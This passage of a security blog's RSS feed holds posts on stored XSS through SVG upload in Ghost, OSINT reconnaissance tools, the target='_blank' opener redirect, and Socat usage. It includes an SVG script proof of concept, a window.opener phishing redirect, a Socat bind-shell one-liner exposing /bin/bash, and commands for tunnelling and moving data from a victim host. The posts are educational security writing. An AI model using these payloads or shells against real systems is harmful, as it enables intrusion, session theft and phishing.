It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&amp;gt;
    &amp;lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&amp;gt;
   &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
      alert(document.domain);
      alert(document.location);
   &amp;lt;/script&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.&lt;/p&gt;

&lt;p&gt;It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;https://snoopysecurity.github.io/test.svg&quot; alt=&quot;test&quot; &quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However, in certain scenarios an &amp;lt;object&amp;gt; element can be used to load and embed an SVG document externally.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object id=&quot;test&quot; data=&quot;https://snoopysecurity.github.io/test.svg&quot;&amp;gt;&amp;lt;/object&amp;gt;
&amp;lt;embed src=&quot;https://snoopysecurity.github.io/test.svg&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;ghost-publishing-platform&quot;&gt;Ghost Publishing Platform&lt;/h3&gt;
&lt;p&gt;Ghost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/1.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/2.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The image location of the stored SVG document can be visited to execute the stored JavaScript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/3.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.&lt;/p&gt;

&lt;p&gt;This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator.&lt;/p&gt;

</description>
        <pubDate>Thu, 20 Sep 2018 09:00:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web_application_security/2018/09/20/ghost_svg_image_upload_to_xss.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web_application_security/2018/09/20/ghost_svg_image_upload_to_xss.html</guid>
        
        
        <category>web_application_security</category>
        
      </item>
    
      <item>
        <title>Top 10 OSINT Tools/Sources for Security Folks</title>
        <description>&lt;p&gt;Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provide information on certain well-known OSINT tools and how they can be used to collection and analyse information.&lt;/p&gt;

&lt;h3 id=&quot;harpoon-an-osint--threat-intelligence-tool&quot;&gt;10 Harpoon: an OSINT / Threat Intelligence tool&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Te-k/harpoon&quot;&gt;Link: Harpoon: an OSINT / Threat Intelligence tool&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Harpoon is a quite recent addition to the OSINT field. Harpoon is a plugin-based tool and it can be used to search multiple services such as Malshare, Spyonweb, Certspotter, Binaryedge and Asn for data.  The tool is also organised in plugins which makes it easier to write plugins to perform useful tasks.  Furthermore, this tool seems more focused on threat hunting compared to bug bounty hunting and red teaming.&lt;/p&gt;

&lt;h3 id=&quot;binaryedge-software-as-a-service&quot;&gt;9 - BinaryEdge Software as a service&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Link: BinaryEdge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BinaryEdge is a platform that gathers data and makes the accessible for a user through their API. This platform is similar to Shodan; and provides information regarding exposed ports/services, banner grabs, torrent information, DNS queries and much more. 
&lt;img src=&quot;https://www.binaryedge.io/img/products/datapoints.png&quot; alt=&quot;alt text&quot; title=&quot;BinaryEdge&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;hunterio&quot;&gt;8 Hunter.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://hunter.io/&quot;&gt;Link: Hunter.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When targeting an organisation, services such as search engines (e.g. Google, Yahoo, Bing) can be used to search for email addresses associated with a domain that a target organization uses for their business. Tools such as &lt;strong&gt;linkedin2username&lt;/strong&gt; and &lt;strong&gt;ScrapedIn&lt;/strong&gt; can also be used  to scrape LinkedIn for potential targets without API restrictions for data reconnaissance&lt;/p&gt;

&lt;p&gt;Hunter.io can also be useful when trying to find email addresses related to a domain. The Hunter service is used for sales personnel to find contacts and leads for an organisation but this service can also be used to collect email addresses as well as names, job titles, and phone numbers.&lt;/p&gt;

&lt;h3 id=&quot;censysio&quot;&gt;7 Censys.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://censys.io/&quot;&gt;Link: Censys.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Censys is a service that scans the Internet searching for devices and return aggregate reports on how resources (i.e. Devices, websites, and certificates) are configured and deployed. This service also provides a search engine that can be used to search for this information.  Due to its feature of showing real-time data, this service can often be useful for bug bounty hunters to quickly map out easy targets.&lt;/p&gt;

&lt;p&gt;The below search is an example of looking for any service/server with its SSL/TLS certificate that can correlates to the search term “PayPal”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/snoopysecurity/Public/raw/master/blog%20archive/images/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;Censys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The above search utilises Certificate Transparency.  Certificate Transparency by design contains all the certificates issued by a participating CA for any given domain. Search engines such as &lt;strong&gt;crt.sh&lt;/strong&gt; also collects this data.&lt;/p&gt;

&lt;h3 id=&quot;open-source-intelligence-browser-extension&quot;&gt;6 Open Source Intelligence Browser Extension&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://www.osintbrowser.com&quot;&gt;Link: Open Source Intelligence Browser Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Open Source Intelligence Browser extension that can be used to quickly search for information by leveraging the Chrome browser. This extension can be useful during Intelligence (OSINT) Investigations. This includes username, telephone, domain and company searches.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.osintbrowser.com/img/screenshot.png&quot; alt=&quot;alt text&quot; title=&quot;http://www.osintbrowser.com&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;whatweb-scanner&quot;&gt;5 WhatWeb Scanner&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb&quot;&gt;Link: WhatWeb Scanner&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.&lt;/p&gt;

&lt;p&gt;WhatWeb is a scanner that conducts web application fingerprinting. This technique often be useful for bug bounty hunters. WhatWeb contains over 1700 plugins which can be customised and used for fingerprinting and can be used to gather information on a variety of application servers including Content Management Systems, Application servers and web application dashboards.  An example of WhatWeb scanner in use can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./whatweb exampletargetsite.com/forum/
http://exampletargetsite.com/forum/ [200] PasswordField[password], HTTPServer[Apache/2.2.15], PoweredBy[phpBB], Apache[2.2.15], IP[88.198.177.36], phpBB[2], PHP[5.2.13], X-Powered-By[PHP/5.2.13], Cookies[phpbb2mysql_data,phpbb2mysql_sid], Title[Smartors Mods Forums - Reloaded], Country[GERMANY][DE]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;intrigueio&quot;&gt;4 Intrigue.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/intrigueio&quot;&gt;Link: Intrigue.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Intrigue.io is a framework that was created for automated attack surface discovery. This framework can be used for port scanning, service discovery, DNS recon as well as search for third party services such as Pastebin, Github etc. Intrigue.io also contains a web interface which can be used to quickly configure and start automated discovery scans. Intrigue.io can also be used as a Vagrant or docker container.  I prefer to use Aquatone these days for attack surface discovery&lt;/p&gt;

&lt;h3 id=&quot;aquatone&quot;&gt;3 Aquatone&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Link: Aquatonet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aquatone is a well-supported and updated tool that can be used to scan large number of hosts and quickly get information regarding an organization’s attack surface. Aquatone has several features including DNS enumeration, port scanning, as well as screenshotting and reporting. Aquatone can also be easily integrated with existing toolsets with minimal effort.&lt;/p&gt;

&lt;h3 id=&quot;recon-ng&quot;&gt;2 Recon-Ng&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/recon-ng/&quot;&gt;Link: Recon-ng&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Recon-Ng is an extremely powerful web reconnaissance framework which can be used by security consultants to gather OSINT data quickly. Recon-Ng follows a modular approach similar to the MetaSploit framework, and also provides useful usability features such as interactive help, and command completion.  Recon-Ng contains numerous modules including DNS, Email and Web application reconnaissance. Numerous bug bounty scripts/wrappers have utilised Recon-Ng in the past including &lt;strong&gt;enumall.py&lt;/strong&gt; by @Jhaddix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.darknet.org.uk/wp-content/uploads/2016/04/recon-ng.png&quot; alt=&quot;alt text&quot; title=&quot;recon-ng&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;spiderfoot&quot;&gt;1 SpiderFoot&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.spiderfoot.net/&quot;&gt;Link: SpiderFoot&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SpiderFoot is an open source intelligence (OSINT) reconnaissance tool that can be used to gather IP addresss, domain names, hostnames, network subnets, ASNs, e-mail addresses of a given search name.  SpiderFoot can be used to query over 100 public data sources (OSINT) and is updated monthly with updates.  SpiderFoot can also be configured with public data source APIs; a full list of documentation can be found here: https://www.spiderfoot.net/documentation/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.spiderfoot.net/images/spiderfoot-browse.png&quot; alt=&quot;alt text&quot; title=&quot;SpiderFoot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;concluding-thoughts&quot;&gt;Concluding thoughts&lt;/h3&gt;
&lt;p&gt;Most of these tools can be used to gather port scan information, search engine dorks, python scripting, passive DNS, Threat intelligence, data visualization, Social Media, SSL/TLS certificates, WHOIS, Autonomous System (AS) Numbers, Cloud information, Wayback Machine, Web crawling, mail exchange information and much more. These are a few tools I use on a regular basis.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Honourable mentions&lt;/strong&gt;: Wapplyzer, Trape, EagleEye, RiskIQ, Skiptracer, Sn1per, Dnsdumpster, Gitrob&lt;/p&gt;

</description>
        <pubDate>Thu, 02 Aug 2018 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</guid>
        
        
        <category>OSINT</category>
        
      </item>
    
      <item>
        <title>The target=&quot;_blank&quot; Vulnerability</title>
        <description>&lt;p&gt;The HTML &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of them being the target attribute. An example can be seen below. Usage of certain attributes can often introduce vulnerabilities in a web application.&lt;/p&gt;

&lt;p&gt;Example Link:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;https://snoopysecurity.github.io/test.html&quot; target=&quot;_blank&quot;&amp;gt;Click Here&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The target attribute specifies the context in where the linked resource will open when the it is clicked by a user. The target attribute supports many values such as &lt;code class=&quot;highlighter-rouge&quot;&gt;_blank&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;_parent&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_top&lt;/code&gt;. The most interesting of these values is the “_blank” value. If the target attribute is used with the “_blank” value, the resource used as link will open in a new tab, or a new window in older browsers.&lt;/p&gt;

&lt;p&gt;However, it was discovered a while back that a link opened via target blank attribute can make changes to the original page, essentially bypassing same origin policy restrictions. An example of this are as follows.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pste.eu/p/N2ad.html&quot; target=&quot;_blank&quot;&gt;Click Here for a POC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Clicking the above link will take you to a webpage with the following JavaScript code:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
window.opener.location = 'https://media.makeameme.org/created/hacked.jpg';
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In the above code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.opener.location&lt;/code&gt; property is used to redirect a user from the initial clicked webpage to an attacker controlled webpage. This could be leveraged to conduct phishing attacks on the initial webpage since the window.opener object has access to the page from where the user clicked the link. However, it should be noted that it is not possible to execute JavaScript on the initial page since the window.opener object only has partial access (TLDR: you can only control the location attribute of the window object so only redirection is possible).&lt;/p&gt;

&lt;p&gt;To make detection of this vulnerability easier, I wrote a Burp Plugin which can be found here: &lt;a href=&quot;https://github.com/snoopysecurity/Noopener-Burp-Extension&quot; target=&quot;_blank&quot;&gt;https://github.com/snoopysecurity/Noopener-Burp-Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The following article also shows a real-world example of this vulnerability: 
&lt;a href=&quot;https://dev.to/ben/the-targetblank-vulnerability-by-example&quot; target=&quot;_blank&quot;&gt;https://dev.to/ben/the-targetblank-vulnerability-by-example&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To prevent pages from abusing this vulnerability, the “noopener” and “noreferrer” attribute can be used. An example of this is shown below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;http://snoopysecurity.github.io&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&amp;gt;Click Me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For older browsers, The “noreferrer” attribute will need to be used since certain browsers such as Firefox doesn’t support the “noopener” attribute.&lt;/p&gt;

&lt;h5 id=&quot;references&quot;&gt;References&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;https://mathiasbynens.github.io/rel-noopener/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 26 Apr 2018 09:43:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web_application_security/2018/04/26/target_blank_vulnerability.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web_application_security/2018/04/26/target_blank_vulnerability.html</guid>
        
        
        <category>web_application_security</category>
        
      </item>
    
      <item>
        <title>Introduction to Socat</title>
        <description>&lt;p&gt;Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.&lt;/p&gt;

&lt;h3 id=&quot;socat-listener&quot;&gt;Socat Listener&lt;/h3&gt;

&lt;p&gt;The following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can also be changed to emulate a UDP listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:123 STDOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To connect to this server, the following command can be issued.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP:192.168.1.81:123 -
&amp;gt; hello
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will send the world &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; to the socat listener listening on port 123.&lt;/p&gt;

&lt;p&gt;Something similar to the following can also be issued to take something from STDIN and send that to a listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami | socat STDIN TCP:192.168.1.81:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo “UDP packet” | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;
&lt;p&gt;The below one liner is an example of binding the bash shell to a port and connecting to it.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;socat-web-server&quot;&gt;Socat web server&lt;/h3&gt;
&lt;p&gt;To start a web server with Socat, the following command can be issued. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; option tells Socat to be verbose and the &lt;code class=&quot;highlighter-rouge&quot;&gt;-T&lt;/code&gt; option can be used to set timeouts.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat -v -T0.05 tcp-l:80,reuseaddr,fork system:&quot;echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h4 id=&quot;https-server&quot;&gt;HTTPS server&lt;/h4&gt;

&lt;p&gt;Socat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
cat key.pem &amp;gt;&amp;gt; cert.pem 
socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - OPENSSL:192.168.1.81:443
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;terminal-emulation&quot;&gt;Terminal Emulation&lt;/h3&gt;

&lt;p&gt;In scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat READLINE,history:/tmp/serialcommands.txt \
  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;redirecting-traffic&quot;&gt;Redirecting Traffic&lt;/h3&gt;
&lt;p&gt;In scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can also specify the bind address and specify what IP ranges can connect to this listener.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;su=nobody&lt;/code&gt; value will ensure that forked processes will run as the nobody low-privileged user&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;tunnelling&quot;&gt;Tunnelling&lt;/h3&gt;
&lt;p&gt;Socat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;file-transfer&quot;&gt;File transfer&lt;/h3&gt;
&lt;p&gt;File transfers can also be conducted with ease using Socat.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat FILE:data.txt TCP:192.168.1.81:1337
socat TCP-LISTEN:1337 OPEN:data.txt,creat,trunc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, since Socat isn’t available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries&lt;/p&gt;

</description>
        <pubDate>Wed, 21 Mar 2018 08:43:59 +0000</pubDate>
        <link>http://snoopysecurity.github.io/network_security/2018/03/21/introduction_to_socat.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/network_security/2018/03/21/introduction_to_socat.html</guid>
        
        
        <category>network_security</category>
        
      </item>
    
  </channel>
</rss>
